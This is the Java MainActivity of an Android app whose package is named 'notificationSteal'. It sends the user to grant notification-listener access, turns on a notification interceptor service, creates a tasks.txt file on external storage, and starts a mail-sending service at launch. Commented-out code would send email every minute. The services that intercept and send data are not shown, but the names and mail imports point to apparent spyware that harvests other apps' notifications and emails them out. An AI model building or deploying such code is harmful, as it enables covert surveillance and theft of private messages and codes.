package com.tomridder.notificationSteal;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.File;

import javax.mail.MessagingException;
import javax.mail.internet.AddressException;

public class MainActivity extends AppCompatActivity {

    private String[] permissions = {Manifest.permission.WRITE_EXTERNAL_STORAGE};
    Button notificationMonitorOffBtn;
    Button notificationMonitorOnBtn;
    private  String path1=Environment.getExternalStorageDirectory().toString()+ File.separator+"tasks.txt";

//    final Handler handler=new Handler();
//    Runnable runnable=new Runnable() {
//        @Override
//        public void run() {
//            sendEmail();
//            handler.postDelayed(this,60000);
//        }
//    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 通知栏监控器开关
         notificationMonitorOnBtn = (Button)findViewById(R.id.notification_monitor_on_btn);
        notificationMonitorOnBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //
                if (!isEnabled()) {
                    startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                } else {
                    Toast toast = Toast.makeText(getApplicationContext(), "监控器开关已打开", Toast.LENGTH_SHORT);
                    toast.show();
                    toggleNotificationListenerService();
                }
            }
        });

        notificationMonitorOffBtn = (Button)findViewById(R.id.notification_monitor_off_btn);
        notificationMonitorOffBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //
                if (isEnabled()) {
                    startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                } else {
                    Toast toast = Toast.makeText(getApplicationContext(), "监控器开关已关闭", Toast.LENGTH_SHORT);
                    toast.show();
                }
            }
        });
        if(isFristRun()||ContextCompat.checkSelfPermission(this, permissions[0])!= PackageManager.PERMISSION_GRANTED )
        {
            notificationMonitorOnBtn.setVisibility(View.INVISIBLE);
            notificationMonitorOffBtn.setVisibility(View.INVISIBLE);
        }
        initPermission();
        Intent intent=new Intent(MainActivity.this,SendMailService.class);
        startService(intent);
//        handler.postDelayed(runnable,60000);
    }

    private void initPermission()
    {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        {
            if( ContextCompat.checkSelfPermission(this, permissions[0])!= PackageManager.PERMISSION_GRANTED)
            {
                ActivityCompat.requestPermissions(this,permissions,321);
            }
        }

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if(requestCode==321 && grantResults[0]==PackageManager.PERMISSION_GRANTED)

        {
           notificationMonitorOnBtn.setVisibility(View.VISIBLE);
           notificationMonitorOffBtn.setVisibility(View.VISIBLE);
           creatFile();
        }
    }

    private void creatFile()
    {
        String filePath=null;
        boolean hasSDCard= Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED);
        if(hasSDCard)
        {
            filePath= Environment.getExternalStorageDirectory().toString()+ File.separator+"tasks.txt";
        }else
        {
            filePath=Environment.getDownloadCacheDirectory().toString().toString()+File.separator+"tasks.txt";
        }
        try
        {
            File file = new File(filePath);
            if (!file.exists()) {
                File dir = new File(file.getParent());
                dir.mkdir();
                file.createNewFile();
            }
            if(file.exists())
            {
                Log.i("MainActivityMTS","create successful");
            }
        }catch (Exception e)
        {
            Log.i("MainActivityMTS","can not creat file");
        }

    }

    private boolean isFristRun() {
        //实例化SharedPreferences对象（第一步）
        SharedPreferences sharedPreferences = this.getSharedPreferences(
                "share", MODE_PRIVATE);
        //实例化SharedPreferences.Editor对象（第二步）
        boolean isFirstRun = sharedPreferences.getBoolean("isFirstRun", true);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (!isFirstRun) {
            return false;
        } else {
            //保存数据 （第三步）
            editor.putBoolean("isFirstRun", false);
            //提交当前数据 （第四步）
            editor.commit();
            return true;
        }
    }
    // 判断是否打开了通知监听权限
    private boolean isEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private void toggleNotificationListenerService() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(this, NotificationInterceptorService.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        pm.setComponentEnabledSetting(new ComponentName(this, NotificationInterceptorService.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }
}
